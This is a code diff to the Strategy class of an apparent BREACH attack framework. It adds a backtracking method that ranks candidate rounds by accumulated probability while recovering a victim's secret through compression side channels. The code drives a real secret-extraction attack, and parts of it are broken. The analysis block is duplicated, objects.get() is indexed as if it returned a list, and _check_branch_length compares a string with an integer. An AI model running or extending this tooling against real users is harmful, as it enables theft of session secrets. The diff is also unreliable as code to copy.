@@ -3,6 +3,7 @@ from django.db.models import Max
 from django.core.exceptions import ValidationError
 
 from breach.analyzer import decide_next_world_state
+from breach.backtracking_analyzer import decide_next_backtracking_world_state
 from breach.models import Target, Round, SampleSet
 from breach.sniffer import Sniffer
 
@@ -50,11 +51,41 @@ class Strategy(object):
                 # If the initial round or samplesets cannot be created, end the analysis
                 return
 
-        self._round = Round.objects.filter(
-            victim=self._victim,
-            index=current_round_index
-        )[0]
+        self._choose_next_round(self._victim.target.method, current_round_index)
+
         self._analyzed = False
+
+    def _choose_next_round(self, method, current_round_index):
+        # Choose next round to analyze, based on the execution method.
+        if method == Target.BACKTRACKING:
+            max_accumulated_prob = Round.objects.filter(
+                victim=self._victim,
+                completed=None
+            ).aggregate(Max('accumulated_probability'))
+
+            # Check if more than one objects have the same accumulated
+            # probability.
+            if isinstance(max_accumulated_prob, list):
+                max_value = max_accumulated_prob[0]['accumulated_probability__max']
+                self._round = Round.objects.get(
+                    victim=self._victim,
+                    completed=None,
+                    accumulated_probability=max_value)[0]
+            else:
+                max_value = max_accumulated_prob['accumulated_probability__max']
+                self._round = Round.objects.get(
+                    victim=self._victim,
+                    completed=None,
+                    accumulated_probability=max_value)
+
+            if not self._round.started:
+                self._round.started = timezone.now()
+                self._round.save()
+        else:
+            self._round = Round.objects.filter(
+                victim=self._victim,
+                index=current_round_index
+            )[0]
 
     def _build_candidates_divide_conquer(self, state):
         candidate_alphabet_cardinality = len(state['knownalphabet']) / 2
@@ -71,7 +102,8 @@ class Strategy(object):
         '''Given a state of the world, produce a list of candidate alphabets.'''
         methods = {
             Target.SERIAL: self._build_candidates_serial,
-            Target.DIVIDE_CONQUER: self._build_candidates_divide_conquer
+            Target.DIVIDE_CONQUER: self._build_candidates_divide_conquer,
+            Target.BACKTRACKING: self._build_candidates_serial
         }
         return methods[self._round.get_method()](state)
 
@@ -79,7 +111,8 @@ class Strategy(object):
         return {
             'knownsecret': self._victim.target.prefix,
             'candidatealphabet': self._victim.target.alphabet,
-            'knownalphabet': self._victim.target.alphabet
+            'knownalphabet': self._victim.target.alphabet,
+            'probability': 1.0
         }
 
     def _get_unstarted_samplesets(self):
@@ -257,13 +290,39 @@ class Strategy(object):
 
         current_round_samplesets = SampleSet.objects.filter(round=self._round, success=True)
         self._decision = decide_next_world_state(current_round_samplesets)
-
-        logger.debug(75 * '#')
-        logger.debug('Decision:')
-        for i in self._decision:
-            logger.debug('\t{}: {}'.format(i, self._decision[i]))
         logger.debug(75 * '#')
 
+        if self._round.get_method() == Target.BACKTRACKING:
+            self._decision = decide_next_backtracking_world_state(current_round_samplesets,
+                                                                  self._round.accumulated_probability)
+
+            logger.debug('Optimal Candidates:')
+            for i in self._decision:
+                logger.debug('{}'.format(i))
+        else:
+            self._decision = decide_next_world_state(current_round_samplesets)
+
+            logger.debug('Decision:')
+            for i in self._decision:
+                logger.debug('\t{}: {}'.format(i, self._decision[i]))
+
+        logger.debug(75 * '#')
+
+        if self._round.get_method() == Target.BACKTRACKING:
+            self._decision = decide_next_backtracking_world_state(current_round_samplesets,
+                                                                  self._round.accumulated_probability)
+
+            logger.debug('Optimal Candidates:')
+            for i in self._decision:
+                logger.debug('\n{}'.format(i))
+        else:
+            self._decision = decide_next_world_state(current_round_samplesets)
+
+            logger.debug('Decision:')
+            for i in self._decision:
+                logger.debug('\t{}: {}'.format(i, self._decision[i]))
+
+        logger.debug(75 * '#')
         self._analyzed = True
 
     def _round_is_completed(self):
@@ -272,12 +331,24 @@ class Strategy(object):
         assert(self._analyzed)
 
         # Do we need to collect more samplesets to build up confidence?
-        return self._decision['confidence'] > self._victim.target.confidence_threshold
+        if self._round.get_method() != Target.BACKTRACKING:
+            return self._decision['confidence'] > self._victim.target.confidence_threshold
+        else:
+            # If backtracking is enabled we don't have to build extra confidence.
+            return True
 
     def _create_next_round(self):
         assert(self._round_is_completed())
 
         self._create_round(self._decision['state'])
+
+    def _create_new_rounds(self):
+        assert(self._round_is_completed())
+
+        # Create round for every optimal candidate.
+        for candidate in self._decision:
+            self._create_round(candidate)
+            self._create_round_samplesets()
 
     def _set_round_cardinalities(self, candidate_alphabets):
         self._round.maxroundcardinality = max(map(len, candidate_alphabets))
@@ -326,14 +397,29 @@ class Strategy(object):
 
         assert(self._analyzed)
 
+        # If backtracking is enabled, we need to pass the accumulated
+        # probability of the given candidate. Else we pass the default value.
+        #
+        # Next round index is calculated by incrementing current round index.
+        # However backtracking does not always analyzes the round with maximum
+        # index so each time we need to extract that value for the rounds to
+        # come.
+        prob = 1.0
+        max_index = self._round.index + 1 if hasattr(self, '_round') else 1
+        if self._victim.target.method == Target.BACKTRACKING:
+            prob = state['probability']
+            if max_index != 1:
+                max_index = Round.objects.filter(victim=self._victim).aggregate(Max('index'))['index__max'] + 1
+
         # This next round could potentially be the final round.
         # A final round has the complete secret stored in knownsecret.
         next_round = Round(
             victim=self._victim,
-            index=self._round.index + 1 if hasattr(self, '_round') else 1,
+            index=max_index,
             amount=self._victim.target.samplesize,
             knownalphabet=state['knownalphabet'],
-            knownsecret=state['knownsecret']
+            knownsecret=state['knownsecret'],
+            accumulated_probability=prob
         )
         next_round.save()
         self._round = next_round
@@ -387,6 +473,9 @@ class Strategy(object):
 
     def _attack_is_completed(self):
         return len(self._round.knownsecret) == self._victim.target.secretlength
+
+    def _check_branch_length(self):
+        return self._round.knownsecret == self._victim.target.secretlength
 
     def _need_for_calibration(self):
         started_samplesets = SampleSet.objects.filter(round=self._round).exclude(started=None)
@@ -494,6 +583,15 @@ class Strategy(object):
         # All batches are completed.
         self._analyze_current_round()
 
+        # Serial and divide and conquer methods require a certain confidence to
+        # complete current round, whereas backtracking only checks if final
+        # secret is recovered.
+        if self._victim.target.method == Target.BACKTRACKING:
+            return self._complete_backtracking_round()
+        else:
+            return self._complete_round()
+
+    def _complete_round(self):
         if self._round_is_completed():
             # Advance to the next round.
             try:
@@ -510,6 +608,22 @@ class Strategy(object):
         self._create_round_samplesets()
 
         return False
+
+    def _complete_backtracking_round(self):
+        self._round.completed = timezone.now()
+        self._round.save()
+
+        if not self._check_branch_length():
+            try:
+                self._create_new_rounds()
+                return False
+            except MaxReflectionLengthError:
+                # If a new round cannot be created, end the attack.
+                return True
+
+        # If current branch is completed, then we already matched the
+        # secretlength.
+        return True
 
     def _begin_attack(self):
         self._create_round(self._get_first_round_state())
